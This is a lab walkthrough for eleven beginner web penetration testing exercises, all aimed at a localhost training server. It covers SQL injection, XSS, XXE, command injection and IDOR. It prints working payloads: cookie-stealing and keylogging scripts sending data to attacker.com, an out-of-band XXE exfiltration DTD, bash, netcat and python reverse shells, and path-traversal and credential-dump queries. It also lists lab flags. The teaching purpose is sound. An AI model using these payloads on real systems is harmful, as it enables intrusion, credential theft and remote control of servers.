# Zeroday Academy - Beginner Labs Walkthrough

**Complete step-by-step solutions for all 11 beginner web penetration testing labs**

---

## Table of Contents

1. [SQL Injection](#1-sql-injection)
2. [Cross-Site Scripting (XSS)](#2-cross-site-scripting-xss)
3. [Authentication Bypass](#3-authentication-bypass)
4. [Sensitive Data Exposure](#4-sensitive-data-exposure)
5. [XML External Entity (XXE)](#5-xml-external-entity-xxe)
6. [Broken Access Control](#6-broken-access-control)
7. [Security Misconfiguration](#7-security-misconfiguration)
8. [Command Injection](#8-command-injection)
9. [Unauthenticated API Endpoints](#9-unauthenticated-api-endpoints)
10. [Sensitive Data in API Responses](#10-sensitive-data-in-api-responses)
11. [Predictable IDs & IDOR](#11-predictable-ids--idor)

---

## 1. SQL Injection

### Vulnerability Description
SQL Injection occurs when untrusted user input is inserted into SQL queries without proper validation or sanitization. This allows attackers to manipulate database queries to extract, modify, or delete data.

### Impact
- Complete database compromise
- Data theft and exfiltration
- Authentication bypass
- Data corruption and deletion
- Privilege escalation

### Lab Solution Steps

#### Step 1: Identify Input Points
**Objective:** Find user input fields that interact with the database

**Using curl:**
```bash
curl "http://localhost:5000/api/vuln/sqli?id=1"
```

**Using Burp Suite:**
1. Configure your browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to `http://localhost:5000/api/vuln/sqli?id=1`
3. In Burp's Proxy tab, observe the HTTP request
4. Send the request to Repeater (Ctrl+R) for manual testing
5. Use the Intruder tab for automated payload testing

**Expected Response:** Normal user data retrieval
**Explanation:** Test the basic functionality to understand normal behavior and identify potential injection points.

#### Step 2: Test for SQL Injection
**Objective:** Insert SQL metacharacters to trigger errors

**Using curl:**
```bash
curl "http://localhost:5000/api/vuln/sqli?id=1'"
```

**Using Burp Suite:**
1. Send the request to Repeater
2. Modify the `id` parameter to: `1'`
3. Click "Send" and observe the response
4. Try additional payloads:
   - `1"`
   - `1' OR '1'='1`
   - `1' AND '1'='1`

**Burp Suite Intruder Setup:**
1. Send request to Intruder (Ctrl+I)
2. Set attack type to "Sniper"
3. Add payload position around the `id` parameter value
4. Load SQL injection payload lists from:
   - Payloads → Load → SecLists/sql-injection
5. Start attack and analyze response differences

**Expected Response:** SQL syntax error or different behavior
**Explanation:** The single quote should trigger a SQL syntax error if the application is vulnerable to SQL injection.

#### Step 3: Determine Column Count
**Objective:** Use UNION SELECT to find the number of columns

```bash
curl "http://localhost:5000/api/vuln/sqli?id=1 UNION SELECT NULL--"
```

**If error occurs, try:**
```bash
curl "http://localhost:5000/api/vuln/sqli?id=1 UNION SELECT NULL,NULL--"
curl "http://localhost:5000/api/vuln/sqli?id=1 UNION SELECT NULL,NULL,NULL--"
```

**Explanation:** Add NULL values until no error occurs to determine the exact number of columns in the original query.

#### Step 4: Extract Database Information
**Objective:** Retrieve database version and structure

```bash
curl "http://localhost:5000/api/vuln/sqli?id=1 UNION SELECT version()--"
```

**For multiple columns:**
```bash
curl "http://localhost:5000/api/vuln/sqli?id=1 UNION SELECT version(),NULL--"
```

**Explanation:** Get database version information to understand the target system and plan further attacks.

#### Step 5: Enumerate Tables
**Objective:** List all tables in the database

```bash
curl "http://localhost:5000/api/vuln/sqli?id=1 UNION SELECT table_name FROM information_schema.tables--"
```

**For specific database:**
```bash
curl "http://localhost:5000/api/vuln/sqli?id=1 UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--"
```

**Explanation:** Discover all available tables in the database for further exploitation.

#### Step 6: Extract Sensitive Data
**Objective:** Retrieve user credentials or sensitive information

```bash
curl "http://localhost:5000/api/vuln/sqli?id=1 UNION SELECT username,password FROM users--"
```

**Alternative payloads:**
```bash
curl "http://localhost:5000/api/vuln/sqli?id=1 UNION SELECT CONCAT(username,':',password) FROM users--"
```

**Explanation:** Extract actual sensitive data from discovered tables, such as user credentials.

### Prevention Measures
1. Use parameterized queries/prepared statements
2. Implement input validation and sanitization
3. Apply principle of least privilege to database accounts
4. Use stored procedures where appropriate
5. Enable SQL query logging and monitoring

---

## 2. Cross-Site Scripting (XSS)

### Vulnerability Description
XSS allows attackers to inject malicious scripts into web pages viewed by other users. These scripts execute in the victim's browser with the same privileges as the legitimate website.

### Impact
- Session hijacking and cookie theft
- Credential harvesting
- Website defacement
- Malware distribution
- Phishing attacks

### Lab Solution Steps

#### Step 1: Identify Input Points
**Objective:** Find areas where user input is reflected in the page

**Using curl:**
```bash
curl "http://localhost:5000/api/vuln/xss?search=test"
```

**Using Burp Suite:**
1. Navigate to the XSS lab endpoint
2. Intercept the request in Proxy
3. Send to Repeater for manual testing
4. Test various input parameters:
   - URL parameters: `?search=`, `?name=`, `?comment=`
   - POST body parameters
   - HTTP headers (User-Agent, Referer, etc.)
5. Use Spider to automatically discover input points

**Expected Response:** The input "test" appears somewhere in the response
**Explanation:** Look for parameters that get displayed back to the user without proper encoding.

#### Step 2: Test Basic XSS
**Objective:** Insert simple script tags to test for filtering

**Using curl:**
```bash
curl "http://localhost:5000/api/vuln/xss?search=<script>alert(1)</script>"
```

**Using Burp Suite:**
1. In Repeater, modify the search parameter to: `<script>alert(1)</script>`
2. Send the request and examine the response
3. Use Burp's built-in XSS payloads via Intruder:
   - Send to Intruder
   - Set payload position on the parameter value
   - Load XSS payload list: Payloads → Load → Built-in payloads → XSS
4. Use DOM Invader extension to test for DOM-based XSS

**Burp Suite Scanner:**
1. Right-click on the request
2. Select "Do active scan"
3. Review findings in the "Issues" tab
4. Analyze detected XSS vulnerabilities with proof-of-concept

**Expected Response:** Script executes or gets filtered
**Explanation:** Basic payload to test if JavaScript is executed or if there are any input filters.

#### Step 3: Bypass Filters
**Objective:** Try different encoding and evasion techniques

```bash
curl "http://localhost:5000/api/vuln/xss?search=<img src=x onerror=alert(1)>"
```

**Alternative payloads:**
```bash
curl "http://localhost:5000/api/vuln/xss?search=<svg onload=alert(1)>"
curl "http://localhost:5000/api/vuln/xss?search=javascript:alert(1)"
curl "http://localhost:5000/api/vuln/xss?search=<iframe src=javascript:alert(1)>"
```

**Explanation:** Use different HTML tags and event handlers to bypass script tag filters.

#### Step 4: Extract Cookies
**Objective:** Steal session cookies using JavaScript

```bash
curl "http://localhost:5000/api/vuln/xss?search=<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>"
```

**Alternative:**
```bash
curl "http://localhost:5000/api/vuln/xss?search=<img src=x onerror=fetch('http://attacker.com/steal?cookie='+document.cookie)>"
```

**Explanation:** Redirect user to attacker-controlled server with their session cookies for account takeover.

#### Step 5: Keylogging Attack
**Objective:** Capture user keystrokes

```bash
curl "http://localhost:5000/api/vuln/xss?search=<script>document.onkeypress=function(e){fetch('http://attacker.com/log?key='+String.fromCharCode(e.which))}</script>"
```

**Explanation:** Log every keystroke to an attacker server to capture passwords and sensitive information.

### Prevention Measures
1. Implement proper output encoding/escaping
2. Use Content Security Policy (CSP) headers
3. Validate and sanitize all user inputs
4. Use HTTPOnly and Secure flags for cookies
5. Implement input filtering with whitelisting approach

---

## 3. Authentication Bypass

### Vulnerability Description
Authentication bypass vulnerabilities allow attackers to gain unauthorized access to restricted areas without providing valid credentials through flaws in authentication logic.

### Impact
- Unauthorized access to restricted areas
- Privilege escalation
- Account takeover
- Data breaches
- Administrative access

### Lab Solution Steps

#### Step 1: Analyze Login Mechanism
**Objective:** Understand how authentication works

```bash
curl -X POST "http://localhost:5000/api/vuln/auth" -d "username=admin&password=password"
```

**Expected Response:** Authentication failure or success message
**Explanation:** Test normal login to understand the authentication flow and response patterns.

#### Step 2: Test SQL Injection in Login
**Objective:** Try SQL injection in authentication fields

```bash
curl -X POST "http://localhost:5000/api/vuln/auth" -d "username=admin' OR '1'='1&password=anything"
```

**Alternative payloads:**
```bash
curl -X POST "http://localhost:5000/api/vuln/auth" -d "username=admin' OR '1'='1'--&password=anything"
curl -X POST "http://localhost:5000/api/vuln/auth" -d "username=admin' OR '1'='1'/*&password=anything"
curl -X POST "http://localhost:5000/api/vuln/auth" -d "username=' OR '1'='1&password=' OR '1'='1"
```

**Explanation:** Bypass authentication using SQL injection to make the login query always return true.

#### Step 3: Default Credentials
**Objective:** Test common default username/password combinations

```bash
curl -X POST "http://localhost:5000/api/vuln/auth" -d "username=admin&password=admin"
curl -X POST "http://localhost:5000/api/vuln/auth" -d "username=admin&password=password"
curl -X POST "http://localhost:5000/api/vuln/auth" -d "username=admin&password=123456"
curl -X POST "http://localhost:5000/api/vuln/auth" -d "username=root&password=root"
```

**Explanation:** Try common default credentials that administrators may not have changed.

#### Step 4: Parameter Manipulation
**Objective:** Manipulate hidden form fields or parameters

```bash
curl -X POST "http://localhost:5000/api/vuln/auth" -d "username=user&password=wrong&admin=true"
curl -X POST "http://localhost:5000/api/vuln/auth" -d "username=user&password=wrong&role=admin"
curl -X POST "http://localhost:5000/api/vuln/auth" -d "username=user&password=wrong&authenticated=true"
```

**Explanation:** Add additional parameters that might bypass authentication checks or grant elevated privileges.

#### Step 5: Session Token Analysis
**Objective:** Analyze session tokens for predictable patterns

```bash
curl -i "http://localhost:5000/api/vuln/auth" | grep -i "set-cookie"
```

**Follow up with multiple requests to analyze patterns:**
```bash
for i in {1..5}; do curl -i "http://localhost:5000/api/vuln/auth" 2>/dev/null | grep -i "set-cookie"; done
```

**Explanation:** Examine session cookies for weak randomization that might allow session prediction or hijacking.

### Prevention Measures
1. Implement strong password policies
2. Use secure session management with strong randomization
3. Implement account lockout mechanisms
4. Use multi-factor authentication
5. Regular security audits of authentication logic

---

## 4. Sensitive Data Exposure

### Vulnerability Description
This vulnerability occurs when applications fail to adequately protect sensitive information like personal data, financial records, or authentication credentials during transmission or storage.

### Impact
- Identity theft
- Financial fraud
- Privacy violations
- Regulatory compliance failures
- Credential exposure

### Lab Solution Steps

#### Step 1: Check HTTP Headers
**Objective:** Examine response headers for sensitive information

```bash
curl -I "http://localhost:5000/api/vuln/data-exposure"
```

**Look for:**
- Server version information
- Debug headers
- Internal application paths
- Technology stack details

**Explanation:** HTTP headers often leak sensitive information about the server environment and application stack.

#### Step 2: Directory Traversal
**Objective:** Attempt to access sensitive files

```bash
curl "http://localhost:5000/api/vuln/data-exposure?file=../../../etc/passwd"
```

**Alternative payloads:**
```bash
curl "http://localhost:5000/api/vuln/data-exposure?file=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
curl "http://localhost:5000/api/vuln/data-exposure?file=....//....//....//etc/passwd"
curl "http://localhost:5000/api/vuln/data-exposure?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
```

**Explanation:** Try to access system files through path traversal to read sensitive configuration files.

#### Step 3: Configuration Files
**Objective:** Look for exposed configuration files

```bash
curl "http://localhost:5000/api/vuln/data-exposure?file=.env"
curl "http://localhost:5000/api/vuln/data-exposure?file=config.php"
curl "http://localhost:5000/api/vuln/data-exposure?file=web.config"
curl "http://localhost:5000/api/vuln/data-exposure?file=application.properties"
```

**Explanation:** Attempt to access environment files and configuration files that often contain database credentials and API keys.

#### Step 4: Database Files
**Objective:** Try to access database files directly

```bash
curl "http://localhost:5000/api/vuln/data-exposure?file=database.sqlite"
curl "http://localhost:5000/api/vuln/data-exposure?file=data.db"
curl "http://localhost:5000/api/vuln/data-exposure?file=backup.sql"
```

**Explanation:** Look for direct access to database files that might contain sensitive user data.

#### Step 5: Source Code Access
**Objective:** Attempt to read application source code

```bash
curl "http://localhost:5000/api/vuln/data-exposure?file=app.js"
curl "http://localhost:5000/api/vuln/data-exposure?file=index.php"
curl "http://localhost:5000/api/vuln/data-exposure?file=main.py"
curl "http://localhost:5000/api/vuln/data-exposure?file=package.json"
```

**Explanation:** Try to access source code files that might contain hardcoded secrets, credentials, or business logic.

### Prevention Measures
1. Encrypt sensitive data at rest and in transit
2. Implement proper access controls and file permissions
3. Use secure file permissions (avoid world-readable files)
4. Remove debug information from production environments
5. Regular security scanning for exposed files and directories

---

## 5. XML External Entity (XXE)

### Vulnerability Description
XXE attacks exploit XML parsers that process external entity references, allowing attackers to access local files, internal network resources, or cause denial of service.

### Impact
- Local file disclosure
- Internal network scanning
- Denial of service attacks
- Remote code execution
- Data exfiltration

### Lab Solution Steps

#### Step 1: Identify XML Input
**Objective:** Find endpoints that accept XML data

```bash
curl -X POST "http://localhost:5000/api/vuln/xxe" \
  -H "Content-Type: application/xml" \
  -d "<?xml version=\"1.0\"?><root>test</root>"
```

**Expected Response:** XML processing occurs
**Explanation:** Test basic XML processing functionality to confirm the endpoint accepts and processes XML input.

#### Step 2: Test External Entity
**Objective:** Inject external entity reference

```bash
curl -X POST "http://localhost:5000/api/vuln/xxe" \
  -H "Content-Type: application/xml" \
  -d "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"
```

**Alternative files to test:**
```bash
# Windows
curl -X POST "http://localhost:5000/api/vuln/xxe" \
  -H "Content-Type: application/xml" \
  -d "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///C:/windows/system32/drivers/etc/hosts\">]><root>&xxe;</root>"

# Application files
curl -X POST "http://localhost:5000/api/vuln/xxe" \
  -H "Content-Type: application/xml" \
  -d "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///var/www/html/config.php\">]><root>&xxe;</root>"
```

**Explanation:** Attempt to read local files through external entity references.

#### Step 3: Parameter Entity Attack
**Objective:** Use parameter entities for more complex attacks

```bash
curl -X POST "http://localhost:5000/api/vuln/xxe" \
  -H "Content-Type: application/xml" \
  -d "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]><root></root>"
```

**Create evil.dtd file on your server:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/exfil?data=%file;'>">
%eval;
%exfiltrate;
```

**Explanation:** Load external DTD for out-of-band data exfiltration when direct reading doesn't work.

#### Step 4: Internal Network Scanning
**Objective:** Scan internal network through XXE

```bash
curl -X POST "http://localhost:5000/api/vuln/xxe" \
  -H "Content-Type: application/xml" \
  -d "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://192.168.1.1:80\">]><root>&xxe;</root>"

curl -X POST "http://localhost:5000/api/vuln/xxe" \
  -H "Content-Type: application/xml" \
  -d "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://localhost:22\">]><root>&xxe;</root>"
```

**Explanation:** Use XXE to probe internal network services that are not accessible from the outside.

### Prevention Measures
1. Disable external entity processing in XML parsers
2. Use less complex data formats like JSON when possible
3. Implement input validation for XML data
4. Use XML libraries with secure default configurations
5. Whitelist allowed DTDs and schemas

---

## 6. Broken Access Control

### Vulnerability Description
Access control vulnerabilities occur when users can access resources or perform actions beyond their intended permissions, often through manipulation of URLs, parameters, or missing authorization checks.

### Impact
- Unauthorized data access
- Privilege escalation
- Data modification without authorization
- Administrative access
- Information disclosure

### Lab Solution Steps

#### Step 1: Identify Protected Resources
**Objective:** Find resources that should require authorization

```bash
curl "http://localhost:5000/api/vuln/access-control?user_id=1"
```

**Expected Response:** User-specific data
**Explanation:** Test normal access to understand the application flow and identify user-specific resources.

#### Step 2: Horizontal Privilege Escalation
**Objective:** Access other users' data by changing parameters

```bash
curl "http://localhost:5000/api/vuln/access-control?user_id=2"
curl "http://localhost:5000/api/vuln/access-control?user_id=3"
curl "http://localhost:5000/api/vuln/access-control?user_id=100"
```

**Test different parameter names:**
```bash
curl "http://localhost:5000/api/vuln/access-control?id=2"
curl "http://localhost:5000/api/vuln/access-control?uid=2"
curl "http://localhost:5000/api/vuln/access-control?account=2"
```

**Explanation:** Change user identifiers to access other users' information without proper authorization.

#### Step 3: Vertical Privilege Escalation
**Objective:** Attempt to access administrative functions

```bash
curl "http://localhost:5000/api/vuln/access-control?user_id=1&admin=true"
curl "http://localhost:5000/api/vuln/access-control?user_id=1&role=admin"
curl "http://localhost:5000/api/vuln/access-control?user_id=1&is_admin=1"
curl "http://localhost:5000/api/vuln/access-control?user_id=1&privilege=administrator"
```

**Explanation:** Add administrative parameters to gain elevated privileges beyond normal user access.

#### Step 4: Direct Object Reference
**Objective:** Access objects directly by manipulating identifiers

```bash
curl "http://localhost:5000/api/vuln/access-control?document_id=1"
curl "http://localhost:5000/api/vuln/access-control?document_id=2"
curl "http://localhost:5000/api/vuln/access-control?file_id=123"
curl "http://localhost:5000/api/vuln/access-control?report_id=456"
```

**Explanation:** Try to access documents, files, or reports by guessing or incrementing object identifiers.

#### Step 5: Method Override
**Objective:** Use different HTTP methods to bypass restrictions

```bash
curl -X PUT "http://localhost:5000/api/vuln/access-control?user_id=1" -d "role=admin"
curl -X PATCH "http://localhost:5000/api/vuln/access-control?user_id=1" -d "admin=true"
curl -X DELETE "http://localhost:5000/api/vuln/access-control?user_id=2"
```

**Test method override headers:**
```bash
curl -X POST "http://localhost:5000/api/vuln/access-control" -H "X-HTTP-Method-Override: PUT" -d "user_id=1&role=admin"
```

**Explanation:** Try different HTTP methods that might have different access control implementations.

### Prevention Measures
1. Implement proper authorization checks on every request
2. Use role-based access control (RBAC)
3. Validate user permissions server-side for all operations
4. Implement the principle of least privilege
5. Use indirect object references instead of direct ones

---

## 7. Security Misconfiguration

### Vulnerability Description
Security misconfigurations occur when applications, servers, or frameworks are deployed with insecure default settings, incomplete configurations, or unnecessary features enabled.

### Impact
- Information disclosure
- Unauthorized access
- System compromise
- Data breaches
- Administrative access

### Lab Solution Steps

#### Step 1: Check Debug Information
**Objective:** Look for exposed debug or error information

```bash
curl "http://localhost:5000/api/vuln/misconfig?debug=true"
curl "http://localhost:5000/api/vuln/misconfig?test=true"
curl "http://localhost:5000/api/vuln/misconfig?verbose=1"
curl "http://localhost:5000/api/vuln/misconfig" -H "X-Debug: 1"
```

**Explanation:** Check if debug mode reveals sensitive information like file paths, database queries, or internal application details.

#### Step 2: Directory Listing
**Objective:** Test for directory listing vulnerabilities

```bash
curl "http://localhost:5000/api/vuln/misconfig/../"
curl "http://localhost:5000/api/vuln/misconfig/../../"
curl "http://localhost:5000/"
curl "http://localhost:5000/admin/"
curl "http://localhost:5000/config/"
```

**Explanation:** Check if directory listing is enabled, which could expose sensitive files and application structure.

#### Step 3: Default Credentials
**Objective:** Test for default administrative interfaces

```bash
curl "http://localhost:5000/admin" -u "admin:admin"
curl "http://localhost:5000/admin" -u "admin:password"
curl "http://localhost:5000/manager" -u "manager:manager"
curl "http://localhost:5000/console" -u "root:root"
```

**Test common admin paths:**
```bash
curl "http://localhost:5000/admin.php"
curl "http://localhost:5000/administrator/"
curl "http://localhost:5000/wp-admin/"
curl "http://localhost:5000/phpmyadmin/"
```

**Explanation:** Look for administrative panels or interfaces that use default credentials.

#### Step 4: HTTP Methods
**Objective:** Test for dangerous HTTP methods

```bash
curl -X TRACE "http://localhost:5000/api/vuln/misconfig"
curl -X OPTIONS "http://localhost:5000/api/vuln/misconfig"
curl -X PUT "http://localhost:5000/api/vuln/misconfig" -d "test data"
curl -X DELETE "http://localhost:5000/api/vuln/misconfig"
```

**Test WebDAV methods:**
```bash
curl -X PROPFIND "http://localhost:5000/api/vuln/misconfig"
curl -X MKCOL "http://localhost:5000/api/vuln/misconfig"
```

**Explanation:** Check if dangerous HTTP methods like TRACE, PUT, DELETE are enabled and can be exploited.

#### Step 5: Server Information
**Objective:** Gather server and application information

```bash
curl -I "http://localhost:5000/api/vuln/misconfig"
curl -I "http://localhost:5000/" | grep -i "server\|x-powered\|version"
```

**Test for common files:**
```bash
curl "http://localhost:5000/robots.txt"
curl "http://localhost:5000/sitemap.xml"
curl "http://localhost:5000/.htaccess"
curl "http://localhost:5000/web.config"
```

**Explanation:** Check headers and common files for information disclosure about the server technology stack.

### Prevention Measures
1. Remove or disable unnecessary features and services
2. Change all default passwords and configurations
3. Implement proper error handling without information disclosure
4. Keep all software and dependencies updated
5. Regular security configuration reviews and hardening

---

## 8. Command Injection

### Vulnerability Description
Command injection vulnerabilities allow attackers to execute arbitrary operating system commands on the server by manipulating input that is passed to system commands without proper validation.

### Impact
- Remote code execution
- Complete system compromise
- Data theft and exfiltration
- Privilege escalation
- Persistent backdoor access

### Lab Solution Steps

#### Step 1: Identify Command Execution Points
**Objective:** Find inputs that might be passed to system commands

```bash
curl -X POST "http://localhost:5000/api/vuln/command" -d "ping=127.0.0.1"
```

**Expected Response:** Ping command output
**Explanation:** Test normal functionality to understand how user input is processed and executed as system commands.

#### Step 2: Test Command Chaining
**Objective:** Use command separators to chain commands

```bash
curl -X POST "http://localhost:5000/api/vuln/command" -d "ping=127.0.0.1; whoami"
curl -X POST "http://localhost:5000/api/vuln/command" -d "ping=127.0.0.1 && whoami"
curl -X POST "http://localhost:5000/api/vuln/command" -d "ping=127.0.0.1 | whoami"
curl -X POST "http://localhost:5000/api/vuln/command" -d "ping=127.0.0.1 || whoami"
```

**Windows alternatives:**
```bash
curl -X POST "http://localhost:5000/api/vuln/command" -d "ping=127.0.0.1 & whoami"
```

**Explanation:** Chain additional commands using various command separators to execute arbitrary commands.

#### Step 3: Command Substitution
**Objective:** Use command substitution to execute commands

```bash
curl -X POST "http://localhost:5000/api/vuln/command" -d "ping=127.0.0.1 \`whoami\`"
curl -X POST "http://localhost:5000/api/vuln/command" -d "ping=127.0.0.1 \$(whoami)"
```

**Explanation:** Use backticks or $() syntax for command substitution to execute nested commands.

#### Step 4: File System Access
**Objective:** Access sensitive files on the system

```bash
curl -X POST "http://localhost:5000/api/vuln/command" -d "ping=127.0.0.1; cat /etc/passwd"
curl -X POST "http://localhost:5000/api/vuln/command" -d "ping=127.0.0.1; ls -la /"
curl -X POST "http://localhost:5000/api/vuln/command" -d "ping=127.0.0.1; find / -name \"*.conf\" 2>/dev/null"
```

**Windows alternatives:**
```bash
curl -X POST "http://localhost:5000/api/vuln/command" -d "ping=127.0.0.1 & type C:\\windows\\system32\\drivers\\etc\\hosts"
curl -X POST "http://localhost:5000/api/vuln/command" -d "ping=127.0.0.1 & dir C:\\"
```

**Explanation:** Read sensitive system files to gather information about the target system.

#### Step 5: Reverse Shell
**Objective:** Establish a reverse shell connection

**Setup listener on your machine:**
```bash
nc -lvp 4444
```

**Execute reverse shell:**
```bash
curl -X POST "http://localhost:5000/api/vuln/command" -d "ping=127.0.0.1; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"
curl -X POST "http://localhost:5000/api/vuln/command" -d "ping=127.0.0.1; nc -e /bin/sh YOUR_IP 4444"
curl -X POST "http://localhost:5000/api/vuln/command" -d "ping=127.0.0.1; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOUR_IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
```

**Explanation:** Create a reverse shell for persistent access and interactive command execution.

### Prevention Measures
1. Avoid calling system commands when possible
2. Use parameterized APIs instead of shell commands
3. Implement strict input validation and sanitization
4. Use whitelist approach for allowed commands and parameters
5. Run applications with minimal privileges (principle of least privilege)

---

## 9. Unauthenticated API Endpoints

### Vulnerability Description
Unauthenticated API endpoints are one of the most common API security vulnerabilities. APIs that fail to properly implement authentication allow attackers to access sensitive data and functionality without valid credentials.

### Lab URL
`http://localhost:5000/api/vuln/api-unauth`

### Impact
- Unauthorized access to sensitive data
- Access to admin functionality
- Data exfiltration
- Internal API exposure
- Complete API compromise

### Solution Steps

#### Step 1: Discover Basic API Endpoint
**Objective:** Test the basic endpoint without parameters

**Using curl:**
```bash
curl "http://localhost:5000/api/vuln/api-unauth"
```

**Using Burp Suite:**
1. Configure browser proxy to 127.0.0.1:8080
2. Navigate to `http://localhost:5000/api/vuln/api-unauth`
3. Observe the API response in Burp's Proxy tab
4. Send to Repeater for manual testing

**Expected Response:** Instructions and available actions
**Explanation:** Understand the API structure and available endpoints before exploitation.

#### Step 2: Access User Data Endpoint
**Objective:** Access user data without authentication

**Using curl:**
```bash
curl "http://localhost:5000/api/vuln/api-unauth?action=users"
```

**Using Burp Suite:**
1. In Repeater, modify the URL to add `?action=users`
2. Click "Send" and observe the response
3. Notice the exposed user data without authentication

**Flag:** `FLAG{api_unauth_users_exposed}`
**Explanation:** The API returns user data including emails and roles without requiring any authentication.

#### Step 3: Access Admin Panel
**Objective:** Access admin functionality without credentials

**Using curl:**
```bash
curl "http://localhost:5000/api/vuln/api-unauth?action=admin"
```

**Using Burp Suite:**
1. Modify the `action` parameter to `admin`
2. Send the request
3. Observe admin privileges and secret keys in response

**Flag:** `FLAG{unauth_admin_access_2024}`
**Response includes:**
- Admin panel access
- User privileges (delete_users, modify_roles, access_logs)
- Secret keys (API key, database password)

**Explanation:** Critical vulnerability - admin functionality accessible without authentication!

#### Step 4: Access Debug Endpoint
**Objective:** Find debug/development endpoints

**Using curl:**
```bash
curl "http://localhost:5000/api/vuln/api-unauth?action=debug"
```

**Flag:** `FLAG{debug_endpoint_exposed}`
**Explanation:** Debug endpoints often expose sensitive system information including file paths, environment details, and configuration.

#### Step 5: Access Secret Data
**Objective:** Find hidden secret endpoints

**Using curl:**
```bash
curl "http://localhost:5000/api/vuln/api-unauth?action=secret"
```

**Flag:** `FLAG{api_secret_data_leak}`
**Explanation:** Secret endpoints may contain API tokens, encryption keys, and database credentials.

### Prevention Measures
1. Implement authentication on all API endpoints
2. Use API keys, OAuth 2.0, or JWT tokens
3. Never expose admin functionality without proper authorization
4. Remove debug endpoints from production
5. Use API rate limiting and monitoring
6. Implement least privilege access control

---

## 10. Sensitive Data in API Responses

### Vulnerability Description
APIs that return overly verbose responses can leak sensitive information such as internal IDs, server paths, database credentials, and configuration details that should never be exposed to clients.

### Lab URL
`http://localhost:5000/api/vuln/api-sensitive-data`

### Impact
- Credential leakage
- Internal system information exposure
- Configuration data exposure
- Increased attack surface
- Privacy violations

### Solution Steps

#### Step 1: Access Profile Endpoint
**Objective:** Identify excessive data in API responses

**Using curl:**
```bash
curl "http://localhost:5000/api/vuln/api-sensitive-data?endpoint=profile"
```

**Using Burp Suite:**
1. Send request to `/api/vuln/api-sensitive-data?endpoint=profile`
2. Examine the JSON response carefully
3. Look for unnecessary sensitive fields

**Flag:** `FLAG{api_profile_data_leak}`
**Exposed data includes:**
- Internal user ID
- Password hash (should never be sent to client!)
- Social security number
- Account creation date
- Last login IP
- Email verification token

**Explanation:** API returns far more data than necessary, including password hashes and SSN.

#### Step 2: Trigger Verbose Error Messages
**Objective:** Extract information from detailed error messages

**Using curl:**
```bash
curl "http://localhost:5000/api/vuln/api-sensitive-data?endpoint=error"
```

**Flag:** `FLAG{verbose_error_messages}`
**Exposed information:**
- Full database query with syntax
- Internal file paths (`/app/server/database.js`)
- Database table names and structure
- Stack trace revealing code structure

**Explanation:** Verbose error messages reveal internal implementation details useful for attackers.

#### Step 3: Access Configuration Endpoint
**Objective:** Extract sensitive configuration data

**Using curl:**
```bash
curl "http://localhost:5000/api/vuln/api-sensitive-data?endpoint=config"
```

**Flag:** `FLAG{config_exposure_critical}`
**Exposed configuration:**
- Database connection string with credentials
- API keys for third-party services (AWS, Stripe, SendGrid)
- Secret encryption keys
- Admin email and credentials
- Debug mode status

**Explanation:** Configuration endpoints should never be publicly accessible - they contain critical secrets.

### Automation Script
**Python script to extract all sensitive data:**
```python
import requests
import json

base_url = "http://localhost:5000/api/vuln/api-sensitive-data"
endpoints = ["profile", "error", "config"]

for endpoint in endpoints:
    response = requests.get(f"{base_url}?endpoint={endpoint}")
    data = response.json()
    print(f"\n=== {endpoint.upper()} ENDPOINT ===")
    print(json.dumps(data, indent=2))
    if 'flag' in data:
        print(f"\n🚩 FLAG: {data['flag']}")
```

### Prevention Measures
1. Return only necessary data in API responses
2. Never include passwords, tokens, or hashes in responses
3. Implement data minimization principles
4. Use generic error messages in production
5. Remove stack traces and debug info from production
6. Separate internal/external API response schemas
7. Use DTO (Data Transfer Objects) pattern

---

## 11. Predictable IDs & IDOR

### Vulnerability Description
Insecure Direct Object Reference (IDOR) vulnerabilities occur when applications use predictable identifiers (sequential IDs) to access resources without proper authorization checks. Attackers can enumerate and access unauthorized data by manipulating ID parameters.

### Lab URL
`http://localhost:5000/api/vuln/api-predictable-ids`

### Impact
- Unauthorized access to other users' data
- Privacy violations
- Data exfiltration
- Access to confidential documents
- Complete data breach via enumeration

### Solution Steps

#### Step 1: Access Your Own Profile
**Objective:** Understand normal authorized access

**Using curl:**
```bash
curl "http://localhost:5000/api/vuln/api-predictable-ids?userId=1001"
```

**Using Burp Suite:**
1. Send GET request with `userId=1001` parameter
2. Observe your own user profile data
3. Note the sequential ID pattern
4. Send to Intruder for automated testing

**Expected Response:** Your profile data (John Doe)
**Explanation:** Establish baseline for normal authorized access.

#### Step 2: Access Another User's Profile (IDOR)
**Objective:** Access unauthorized user data by changing ID

**Using curl:**
```bash
curl "http://localhost:5000/api/vuln/api-predictable-ids?userId=1002"
```

**Using Burp Suite:**
1. In Repeater, change `userId` from `1001` to `1002`
2. Click "Send"
3. Observe unauthorized access to Jane Smith's profile

**Flag:** `FLAG{idor_user_profile_access}`
**Explanation:** Sequential IDs allow easy enumeration and unauthorized access to other users' data.

#### Step 3: Enumerate All Users
**Objective:** Automate user enumeration using Burp Intruder

**Using Burp Suite Intruder:**
1. Send request to Intruder (Ctrl+I)
2. Set attack type to "Sniper"
3. Add payload position: `userId=§1001§`
4. Payloads tab → Payload type: Numbers
5. Set range: 1001-1010 (sequential)
6. Start attack
7. Examine all responses for different user data

**Using bash script:**
```bash
for id in {1001..1010}; do
  echo "Testing User ID: $id"
